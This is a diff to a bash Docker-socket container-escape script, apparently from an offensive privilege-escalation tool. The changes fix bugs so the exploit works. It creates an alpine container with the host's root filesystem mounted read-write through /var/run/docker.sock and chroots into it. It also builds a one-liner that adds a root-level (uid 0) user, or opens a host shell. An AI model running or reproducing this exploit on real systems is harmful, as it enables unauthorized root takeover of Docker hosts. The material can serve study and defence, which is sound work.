@@ -878,7 +878,7 @@ prepareExploit() {
     printMsg "Password ................." "$password"
     printMsg "Clean up ................." "Automatic on container exit"
     # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
-    cmd="useradd $username;echo \"$password:$password\"|chpasswd $username;usermod -ou 0 $username"
+    cmd="useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username"
     
   elif [ "$command" ]; then
     
@@ -916,7 +916,7 @@ prepareExploit() {
     printMsg "Exploit Type ............." "Local Shell"
     printMsg "Create shell ............." "Yes"
     printMsg "Clean up ................." "Automatic on container exit"
-    cmd="chroot /mnt sh"
+    cmd="/bin/sh"
   fi
 
   if ! [ "$cmd" ]; then
@@ -988,7 +988,7 @@ exploitDockerSock() {
     exit
   fi
 
-  if [ -S "$dockerSockPath" ]; then
+  if ! [ -S "$dockerSockPath" ]; then
     printError "Docker sock not found, but required for this exploit"
     exit
   fi
@@ -998,7 +998,7 @@ exploitDockerSock() {
   nl
 
   # Create docker container using the docker sock
-  payload="[\"/bin/sh\",\"-c\",\"chroot /mnt $cmd\"]"
+  payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
   response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
   if ! [ $? ]; then
@@ -1006,8 +1006,6 @@ exploitDockerSock() {
     echo "$response"
     return
   fi
-
-  echo "$response"
 
   revShellContainerID=$(echo "$response" | cut -d'"' -f4)
   printQuestion "Creating container ....."
